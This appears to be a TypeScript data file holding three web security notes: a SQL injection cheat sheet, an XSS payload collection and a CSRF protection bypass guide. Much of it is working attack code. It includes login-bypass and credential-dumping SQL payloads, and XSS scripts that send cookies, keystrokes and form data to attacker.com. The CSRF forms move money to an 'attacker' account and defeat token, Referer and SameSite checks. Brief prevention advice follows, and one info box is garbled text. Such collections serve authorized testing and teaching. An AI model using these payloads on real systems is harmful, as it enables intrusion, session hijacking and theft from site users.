export interface NoteContent {
  title: string
  filename: string
  date: string
  lastUpdated: string
  category: string
  tags: string[]
  sections: {
    title: string
    content: {
      type: "text" | "code" | "list" | "warning" | "info"
      content?: string
      language?: string
      items?: string[]
    }[]
  }[]
}

export const notesContent: Record<string, NoteContent> = {
  "sql-injection-cheat-sheet": {
    title: "SQL Injection Cheat Sheet",
    filename: "sql_injection_cheatsheet.md",
    date: "2024-01-15",
    lastUpdated: "2024-01-15",
    category: "Web Application Security",
    tags: ["SQLi", "Database", "OWASP"],
    sections: [
      {
        title: "Introduction",
        content: [
          {
            type: "text",
            content:
              "SQL Injection is a code injection technique that exploits security vulnerabilities in an application's software when user input is not properly sanitized before being included in SQL queries.",
          },
          {
            type: "warning",
            content:
              "This information is for educational and authorized testing purposes only. Never attempt SQL injection on systems you don't own or lack explicit permission to test.",
          },
          {
            type: "info",
            content:
              "This inforefsdfsdfmation is for educational and authorized testing purposes only. Never attempt SQL injection on systems you don't own or lack explicit permission to test.",
          },
        ],
      },
      {
        title: "Basic SQL Injection Payloads",
        content: [
          {
            type: "text",
            content: "Here are some fundamental SQL injection payloads for different scenarios:",
          },
          {
            type: "code",
            language: "sql",
            content: `-- Basic authentication bypass
' OR '1'='1' --
' OR 1=1 --
admin'--
admin'/*

-- Union-based injection
' UNION SELECT 1,2,3--
' UNION SELECT null,username,password FROM users--

-- Boolean-based blind injection
' AND 1=1--
' AND 1=2--
' AND (SELECT COUNT(*) FROM users)>0--

-- Time-based blind injection
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM users) > 0; WAITFOR DELAY '00:00:05'--`,
          },
        ],
      },
      {
        title: "Database-Specific Payloads",
        content: [
          {
            type: "text",
            content: "Different database systems require specific syntax modifications:",
          },
          {
            type: "code",
            language: "sql",
            content: `-- MySQL
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--
' UNION SELECT null,concat(username,':',password),null FROM users--
' AND SLEEP(5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
' UNION SELECT null,username||':'||password,null FROM users--

-- Microsoft SQL Server
'; WAITFOR DELAY '00:00:05'--
' UNION SELECT null,username+':'+password,null FROM users--

-- Oracle
' UNION SELECT null,username||':'||password,null FROM users--
'; BEGIN DBMS_LOCK.SLEEP(5); END;--`,
          },
        ],
      },
      {
        title: "Information Gathering",
        content: [
          {
            type: "text",
            content: "Extracting database information through SQL injection:",
          },
          {
            type: "code",
            language: "sql",
            content: `-- Database version
' UNION SELECT @@version,null,null--
' UNION SELECT version(),null,null--

-- Current database
' UNION SELECT database(),null,null--
' UNION SELECT db_name(),null,null--

-- List tables
' UNION SELECT table_name,null,null FROM information_schema.tables--
' UNION SELECT name,null,null FROM sysobjects WHERE xtype='U'--

-- List columns
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users'--`,
          },
        ],
      },
      {
        title: "Advanced Techniques",
        content: [
          {
            type: "list",
            items: [
              "Second-order SQL injection: Payload stored and executed later",
              "Out-of-band SQL injection: Using DNS or HTTP requests to exfiltrate data",
              "NoSQL injection: Targeting MongoDB, CouchDB, etc.",
              "Blind SQL injection: Inferring data through boolean or time-based responses",
              "Error-based injection: Extracting data through database error messages",
            ],
          },
        ],
      },
      {
        title: "Prevention Methods",
        content: [
          {
            type: "text",
            content: "Best practices to prevent SQL injection vulnerabilities:",
          },
          {
            type: "list",
            items: [
              "Use parameterized queries/prepared statements",
              "Implement proper input validation and sanitization",
              "Apply the principle of least privilege for database accounts",
              "Use stored procedures with proper parameter handling",
              "Implement Web Application Firewalls (WAF)",
              "Regular security testing and code reviews",
              "Keep database software updated",
            ],
          },
          {
            type: "code",
            language: "python",
            content: `# Example of secure parameterized query in Python
import sqlite3

# VULNERABLE CODE - DON'T DO THIS
def vulnerable_login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)

# SECURE CODE - USE THIS INSTEAD
def secure_login(username, password):
    query = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(query, (username, password))`,
          },
        ],
      },
      {
        title: "Testing Tools",
        content: [
          {
            type: "list",
            items: [
              "SQLMap - Automated SQL injection testing tool",
              "Burp Suite - Web application security testing",
              "OWASP ZAP - Free security testing proxy",
              "Havij - Automated SQL injection tool",
              "jSQL Injection - Java-based SQL injection tool",
            ],
          },
        ],
      },
    ],
  },
  "xss-payload-collection": {
    title: "XSS Payload Collection",
    filename: "xss_payloads.md",
    date: "2024-01-12",
    lastUpdated: "2024-01-12",
    category: "Web Application Security",
    tags: ["XSS", "JavaScript", "Payloads"],
    sections: [
      {
        title: "Cross-Site Scripting (XSS) Overview",
        content: [
          {
            type: "text",
            content:
              "Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. There are three main types: Reflected, Stored, and DOM-based XSS.",
          },
          {
            type: "warning",
            content:
              "These payloads are for educational and authorized testing purposes only. Use responsibly and only on systems you own or have explicit permission to test.",
          },
        ],
      },
      {
        title: "Basic XSS Payloads",
        content: [
          {
            type: "text",
            content: "Fundamental XSS payloads for initial testing:",
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Basic alert payloads -->
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>

<!-- Image-based XSS -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(1)>

<!-- SVG-based XSS -->
<svg onload=alert('XSS')>
<svg><script>alert('XSS')</script></svg>

<!-- Event handler XSS -->
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>`,
          },
        ],
      },
      {
        title: "Filter Bypass Techniques",
        content: [
          {
            type: "text",
            content: "Techniques to bypass common XSS filters and WAFs:",
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Case variation -->
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>

<!-- Encoding bypasses -->
<script>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>

<!-- HTML entity encoding -->
<script>alert('XSS')</script>
<script>alert(&#88;&#83;&#83;)</script>

<!-- URL encoding -->
%3Cscript%3Ealert('XSS')%3C/script%3E

<!-- Double encoding -->
%253Cscript%253Ealert('XSS')%253C/script%253E

<!-- Unicode bypasses -->
<script>alert('XSS')</script>
<script>\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')</script>`,
          },
        ],
      },
      {
        title: "Advanced XSS Payloads",
        content: [
          {
            type: "text",
            content: "More sophisticated payloads for complex scenarios:",
          },
          {
            type: "code",
            language: "javascript",
            content: `// Cookie stealing
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<script>new Image().src='http://attacker.com/steal.php?cookie='+document.cookie</script>

// Session hijacking
<script>fetch('http://attacker.com/steal.php?session='+document.cookie)</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keylog.php?key=' + String.fromCharCode(e.which));
}
</script>

// Form data theft
<script>
document.forms[0].onsubmit = function() {
    fetch('http://attacker.com/steal.php?data=' + 
          encodeURIComponent(new FormData(this)));
}
</script>

// Phishing redirect
<script>
if(confirm('Session expired. Please login again.')) {
    window.location = 'http://attacker.com/fake-login.html';
}
</script>`,
          },
        ],
      },
      {
        title: "DOM-Based XSS Payloads",
        content: [
          {
            type: "text",
            content: "Payloads specifically targeting DOM-based XSS vulnerabilities:",
          },
          {
            type: "code",
            language: "javascript",
            content: `// Hash-based DOM XSS
#<script>alert('XSS')</script>
#<img src=x onerror=alert('XSS')>

// URL parameter manipulation
?name=<script>alert('XSS')</script>
?search=<img src=x onerror=alert('XSS')>

// Fragment identifier
#javascript:alert('XSS')

// Location-based
javascript:alert('XSS')

// PostMessage XSS
<script>
window.addEventListener('message', function(e) {
    document.body.innerHTML = e.data;
});
parent.postMessage('<img src=x onerror=alert("XSS")>', '*');
</script>`,
          },
        ],
      },
      {
        title: "Context-Specific Payloads",
        content: [
          {
            type: "text",
            content: "Payloads tailored for specific injection contexts:",
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Inside HTML attributes -->
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
" autofocus onfocus="alert('XSS')

<!-- Inside JavaScript strings -->
'; alert('XSS'); //
\\'; alert('XSS'); //

<!-- Inside JavaScript comments -->
*/alert('XSS');//

<!-- Inside CSS -->
</style><script>alert('XSS')</script>
expression(alert('XSS'))

<!-- Inside JSON -->
{"name": "</script><script>alert('XSS')</script>"}

<!-- Inside XML -->
<name><![CDATA[</name><script>alert('XSS')</script>]]></name>`,
          },
        ],
      },
      {
        title: "Prevention Techniques",
        content: [
          {
            type: "text",
            content: "Best practices to prevent XSS vulnerabilities:",
          },
          {
            type: "list",
            items: [
              "Input validation and sanitization",
              "Output encoding/escaping",
              "Content Security Policy (CSP) implementation",
              "Use of secure frameworks and libraries",
              "HTTP-only cookies for sensitive data",
              "Regular security testing and code reviews",
              "X-XSS-Protection header configuration",
            ],
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Content Security Policy example -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline';">

<!-- X-XSS-Protection header -->
X-XSS-Protection: 1; mode=block

<!-- Secure cookie settings -->
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict`,
          },
        ],
      },
    ],
  },
  "csrf-protection-bypass": {
    title: "CSRF Protection Bypass Techniques",
    filename: "csrf_bypass.md",
    date: "2024-01-10",
    lastUpdated: "2024-01-10",
    category: "Web Application Security",
    tags: ["CSRF", "Tokens", "Bypass"],
    sections: [
      {
        title: "CSRF Overview",
        content: [
          {
            type: "text",
            content:
              "Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. This guide covers various techniques to bypass CSRF protections.",
          },
          {
            type: "warning",
            content:
              "This information is for educational and authorized security testing only. Never perform CSRF attacks on applications without explicit permission.",
          },
        ],
      },
      {
        title: "Token-Based Bypass Techniques",
        content: [
          {
            type: "text",
            content: "Methods to bypass CSRF token validation:",
          },
          {
            type: "list",
            items: [
              "Remove the CSRF token parameter entirely",
              "Submit an empty CSRF token value",
              "Use a random/invalid token value",
              "Change the request method (POST to GET)",
              "Submit the token in wrong parameter name",
              "Use another user's valid token",
              "Extract token via XSS if present",
            ],
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Original protected form -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="abc123xyz">
    <input type="text" name="amount" value="1000">
    <input type="text" name="to_account" value="attacker">
    <input type="submit" value="Transfer">
</form>

<!-- Bypass attempt 1: Remove token -->
<form action="/transfer" method="POST">
    <input type="text" name="amount" value="1000">
    <input type="text" name="to_account" value="attacker">
    <input type="submit" value="Transfer">
</form>

<!-- Bypass attempt 2: Empty token -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="">
    <input type="text" name="amount" value="1000">
    <input type="text" name="to_account" value="attacker">
    <input type="submit" value="Transfer">
</form>

<!-- Bypass attempt 3: Change method -->
<form action="/transfer" method="GET">
    <input type="text" name="amount" value="1000">
    <input type="text" name="to_account" value="attacker">
    <input type="submit" value="Transfer">
</form>`,
          },
        ],
      },
      {
        title: "Referer Header Bypass",
        content: [
          {
            type: "text",
            content: "Techniques to bypass Referer header validation:",
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Using data URI to suppress referer -->
<iframe src="data:text/html,
<form action='https://victim.com/transfer' method='POST'>
<input name='amount' value='1000'>
<input name='to_account' value='attacker'>
</form>
<script>document.forms[0].submit()</script>">
</iframe>

<!-- Using meta refresh to suppress referer -->
<meta name="referrer" content="no-referrer">
<form action="https://victim.com/transfer" method="POST">
    <input name="amount" value="1000">
    <input name="to_account" value="attacker">
</form>

<!-- Using JavaScript to suppress referer -->
<script>
var form = document.createElement('form');
form.action = 'https://victim.com/transfer';
form.method = 'POST';
form.referrerPolicy = 'no-referrer';

var amount = document.createElement('input');
amount.name = 'amount';
amount.value = '1000';
form.appendChild(amount);

document.body.appendChild(form);
form.submit();
</script>`,
          },
        ],
      },
      {
        title: "SameSite Cookie Bypass",
        content: [
          {
            type: "text",
            content: "Methods to bypass SameSite cookie protections:",
          },
          {
            type: "list",
            items: [
              "Top-level navigation attacks (SameSite=Lax bypass)",
              "Using GET requests for state-changing operations",
              "Exploiting subdomain vulnerabilities",
              "Using popup windows for navigation",
              "WebSocket connections (not subject to SameSite)",
            ],
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Top-level navigation bypass for SameSite=Lax -->
<script>
window.open('https://victim.com/transfer?amount=1000&to_account=attacker');
</script>

<!-- Using form with target="_blank" -->
<form action="https://victim.com/transfer" method="POST" target="_blank">
    <input name="amount" value="1000">
    <input name="to_account" value="attacker">
    <input type="submit" value="Click here for free money!">
</form>

<!-- Using window.location for GET-based CSRF -->
<script>
window.location = 'https://victim.com/delete_account?confirm=yes';
</script>`,
          },
        ],
      },
      {
        title: "Double Submit Cookie Bypass",
        content: [
          {
            type: "text",
            content: "Bypassing double submit cookie CSRF protection:",
          },
          {
            type: "code",
            language: "javascript",
            content: `// If attacker can set cookies on victim domain
// Using subdomain cookie injection
document.cookie = "csrf_token=attacker_controlled_value; domain=.victim.com";

// Then submit form with matching token
var form = document.createElement('form');
form.action = 'https://victim.com/transfer';
form.method = 'POST';

var token = document.createElement('input');
token.name = 'csrf_token';
token.value = 'attacker_controlled_value';
form.appendChild(token);

var amount = document.createElement('input');
amount.name = 'amount';
amount.value = '1000';
form.appendChild(amount);

document.body.appendChild(form);
form.submit();`,
          },
        ],
      },
      {
        title: "Content-Type Based Bypass",
        content: [
          {
            type: "text",
            content: "Bypassing CSRF protection by manipulating Content-Type headers:",
          },
          {
            type: "code",
            language: "html",
            content: `<!-- Using text/plain to bypass preflight -->
<form action="https://victim.com/api/transfer" 
      method="POST" 
      enctype="text/plain">
    <input name='{"amount":1000,"to_account":"attacker","csrf_token":"' 
           value='ignored"}'>
</form>

<!-- Using multipart/form-data -->
<form action="https://victim.com/transfer" 
      method="POST" 
      enctype="multipart/form-data">
    <input name="amount" value="1000">
    <input name="to_account" value="attacker">
</form>

<!-- JavaScript fetch with custom content-type -->
<script>
fetch('https://victim.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'text/plain'
    },
    body: '{"amount":1000,"to_account":"attacker"}'
});
</script>`,
          },
        ],
      },
      {
        title: "Prevention Best Practices",
        content: [
          {
            type: "text",
            content: "Comprehensive CSRF protection strategies:",
          },
          {
            type: "list",
            items: [
              "Implement strong CSRF tokens (cryptographically secure, unique per session)",
              "Validate tokens on server-side for all state-changing operations",
              "Use SameSite=Strict cookies for sensitive operations",
              "Implement proper Referer/Origin header validation",
              "Use double submit cookie pattern correctly",
              "Implement CAPTCHA for critical operations",
              "Use custom headers for AJAX requests",
              "Implement proper session management",
            ],
          },
          {
            type: "code",
            language: "python",
            content: `# Example secure CSRF implementation in Python/Flask
import secrets
from flask import session, request, abort

def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token():
    token = session.get('csrf_token')
    if not token or token != request.form.get('csrf_token'):
        abort(403)  # Forbidden
    
# Usage in route
@app.route('/transfer', methods=['POST'])
def transfer_money():
    validate_csrf_token()
    # Process transfer...`,
          },
        ],
      },
    ],
  },
}
